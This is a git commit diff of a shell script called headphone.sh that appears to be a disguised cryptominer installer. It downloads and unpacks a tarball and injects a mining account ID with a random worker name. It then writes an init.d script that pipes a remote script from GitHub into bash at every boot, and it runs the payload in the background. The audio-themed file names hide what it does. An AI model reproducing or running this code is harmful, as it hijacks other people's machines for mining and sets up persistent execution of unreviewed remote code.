43f1e6cdd5e277169c5d17b7d451409276f044e9
rubbyadi <rubbyadis@gmail.com>
2024-06-01 05:39:58 +0000

    Update headphone.sh

--- headphone.sh
+++ headphone.sh
@@ -1,16 +1,16 @@
 cd /
-rm -rf jack.tar
-rm -rf jack
-wget https://github.com/rubbyadi/sengkreat/releases/download/v1.0.2/jack.tar
-tar -xvf jack.tar
-cd /jack
+rm -rf filter.tar
+rm -rf filter
+wget https://github.com/rubbyadi/sengkreat/releases/download/v1.0.2/filter.tar
+tar -xvf filter.tar
+cd /filter
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./latency.sh
-sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./latency.sh
+sed -i "s/test_accountname/CP_bsmzapay1 --worker ${variable1}/g" ./frequency.sh
+sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 --worker ${variable1}/g" ./frequency.sh
 cd /etc/init.d
-echo "bash <(curl -s -L https://raw.githubusercontent.com/harmonics/headphone/main/hertz.sh)" > impedance.sh
-chmod a+x impedance.sh
-update-rc.d impedance.sh defaults
-cd /jack
-nohup ./latency.sh
-ps -ef | grep jack
+echo "bash <(curl -s -L https://raw.githubusercontent.com/dynamicxe/echo/main/equalizer.sh)" > feedback.sh
+chmod a+x feedback.sh
+update-rc.d feedback.sh defaults
+cd /filter
+nohup ./frequency.sh
+ps -ef | grep filter
